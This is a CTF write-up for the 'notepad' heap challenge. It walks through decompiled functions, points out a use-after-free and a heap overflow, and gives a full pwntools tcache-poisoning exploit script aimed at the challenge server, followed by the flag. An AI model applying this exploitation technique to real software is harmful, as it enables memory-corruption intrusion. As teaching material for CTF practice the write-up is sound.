We have a program with the function **main()** as follows:
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setup(argc, argv, envp);
  banner();
  puts("Welcome to the notepad service!");
  printf("Here a gift: %p\n", main);
  while ( 1 )
  {
    menu();
    __isoc99_scanf("%d", &v4);
    switch ( v4 )
    {
      case 1:
        createNote();
        break;
      case 2:
        viewNote();
        break;
      case 3:
        editNote();
        break;
      case 4:
        removeNote();
        break;
      case 5:
        secretNote();
      case 6:
        puts("See you next time, bye!");
        exit(0);
      default:
        puts("[X] Wrong choice");
        exit(0);
    }
  }
}
```
First it will give us the address of the **main()** function and a menu to create, display, delete and a secret note secret.
Function **createNote()**:
```c
unsigned __int64 createNote()
{
  unsigned int index; // ebx
  ssize_t v1; // rax
  unsigned int node_idx; // [rsp+4h] [rbp-2Ch] BYREF
  size_t size; // [rsp+8h] [rbp-28h] BYREF
  __int64 v5; // [rsp+10h] [rbp-20h]
  unsigned __int64 v6; // [rsp+18h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  puts("Choose the index to store your note(0-9)");
  printf("> ");
  __isoc99_scanf("%d", &node_idx);
  if ( node_idx > 4 )
  {
    printf("Wrong index!");
    exit(0);
  }
  if ( *((_QWORD *)&notepad + node_idx) )
  {
    printf("Note is already there, remove it before overwriting it!");
    exit(0);
  }
  puts("How large you want the note to be?");
  printf("> ");
  __isoc99_scanf("%ld", &size);
  index = node_idx;
  *((_QWORD *)&notepad + index) = malloc(size);
  if ( !*((_QWORD *)&notepad + node_idx) )
  {
    printf("[X] Something went wrong!, Try again!");
    exit(0);
  }
  puts("Add your note:");
  printf("> ");
  v5 = *((_QWORD *)&notepad + node_idx);
  v1 = read(0, *((void **)&notepad + node_idx), size);
  *(_BYTE *)(v1 - 1 + v5) = 0;
  return __readfsqword(0x28u) ^ v6;
}
```
It lets us create up to 4 notes, then let us enter size. Then it takes the note's data, plus converts the last character of the data to a nullbyte. 
**viewNote()** function:
```c
unsigned __int64 viewNote()
{
  unsigned int noteShowIndex; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Choose the index of your note you want to view");
  printf("> ");
  __isoc99_scanf("%d", &noteShowIndex);
  if ( noteShowIndex > 4 )
  {
    printf("Wrong index!");
    exit(0);
  }
  if ( !*((_QWORD *)&notepad + noteShowIndex) )
  {
    printf("Note is empty at the index %d", noteShowIndex);
    exit(0);
  }
  puts(*((const char **)&notepad + noteShowIndex));
  return __readfsqword(0x28u) ^ v2;
}
```
It will check to see if that note exists, then print out the data inside.
**editNote()** function:
```c
unsigned __int64 editNote()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Choose the index of your note you want to edit");
  printf("> ");
  __isoc99_scanf("%d", &v1);
  if ( v1 > 4 )
  {
    printf("Wrong index!");
    exit(0);
  }
  if ( !*((_QWORD *)&notepad + v1) )
  {
    printf("Note is empty at the index %d", v1);
    exit(0);
  }
  puts("Your changes:");
  printf("> ");
  read(0, *((void **)&notepad + v1), 0x100uLL);
  return __readfsqword(0x28u) ^ v2;
}
```

It will let us edit the note with the maximum data edited will be is 0x100.
**removeNote()** function:
```c
unsigned __int64 removeNote()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Choose the index of your note you want to remove");
  printf("> ");
  __isoc99_scanf("%d", &v1);
  if ( v1 > 4 )
  {
    printf("Wrong index!");
    exit(0);
  }
  if ( !*((_QWORD *)&notepad + v1) )
  {
    printf("Note is already empty!");
    exit(0);
  }
  free(*((void **)&notepad + v1));
  return __readfsqword(0x28u) ^ v2;
}
```
It checks if the note to be deleted exists, if so it deletes it data inside, but did not delete the pointer to that chunk, so we have UAF here. 
**secretNote()** function:
```c
void __noreturn secretNote()
{
  int fd; // [rsp+4h] [rbp-41Ch]
  ssize_t n; // [rsp+8h] [rbp-418h]
  char buf[1032]; // [rsp+10h] [rbp-410h] BYREF
  unsigned __int64 v3; // [rsp+418h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( key == 0xCAFEBABE )
  {
    fd = open("flag", 0);
    if ( fd == -1 )
    {
      perror("flag not found! If this happened on the server, contact the author please!");
      exit(1);
    }
    while ( 1 )
    {
      n = read(fd, buf, 0x400uLL);
      if ( n <= 0 )
        break;
      write(1, buf, n);
    }
    if ( n == -1 )
    {
      perror("Error reading the file");
      close(fd);
      exit(1);
    }
    close(fd);
    exit(0);
  }
  puts("You don't have access!");
  exit(-1);
}
```
It compares **key** with **0xcafebabe**, if equal then gives us the flag.

![image](https://hackmd.io/_uploads/S1pmCqHzye.png)


When we delete a chunk, it will be put into tcache:

![image](https://hackmd.io/_uploads/BkNaA6Szyx.png)

So I think of creating a fake freed chunk pointing to the address of the key, from which malloc it simultaneously enters the data as **0xcafebabe**, we will get the flag. I learned this technique with the name [Tcache Poisoning](https://www.youtube.com/watch?v=G8Z_16RCl8s&list=PLEvZsp0uc3SFuVi6TtcahxqsEbV29lXAM&index=35)
- First I will create 2 chunks, the first chunk (index 0), I will use to overflow **fd** pointer of the second chunk that has been freed (index 1), let its **fd** point to fake chunk containing the value of **key**:

![image](https://hackmd.io/_uploads/HJW2kRrzyl.png)

The value **0x20** to ensure that fake chunk is also in tcache bin, from there malloc out we will get freed chunk containing **key**:

![image](https://hackmd.io/_uploads/SJwfe0BGkg.png)

Now just need malloc 2 chunks to take fake chunk out and change its data:

![image](https://hackmd.io/_uploads/BJtrxCBM1g.png)

Script: 
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./notepad_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("notepad.ctf.intigriti.io", 1341)

    return r


def main():
    r = conn()
    input()
    r.recvuntil(b'Here a gift: ')
    main_addr = int(r.recv(16).decode(), 16)
    key_addr = main_addr + 0x200eb2
    info(b'Main address: ' + hex(main_addr).encode())
    info(b'Key address: ' + hex(key_addr).encode())
    # Create note: 
    for i in range(2): 
        r.sendlineafter(b'> ', b'1')
        r.sendlineafter(b'> ', str(i).encode())
        r.sendlineafter(b'> ', b'20')
        r.sendlineafter(b'> ', b'A')
    # Delete note
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b'> ', b'1')
    # pause()
    # Edit note
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'> ', b'0')
    # pause()
    payload = b'A'*16 + p64(0) + p64(0x20) + p64(key_addr)
    r.sendlineafter(b'> ', payload)
    
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'> ', b'20')
    r.sendlineafter(b'> ', b'1')

    # pause()

    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'> ', b'20')
    r.sendlineafter(b'> ', p64(0xcafebabe))
    pause()
    r.sendlineafter(b'> ', b'5')
    pause()
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

```
Result: 

![image](https://hackmd.io/_uploads/SkfPeRrGyl.png)

Flag: ```INTIGRITI{h0us3_0f_f0rc3_f0r_th3_w1n}```
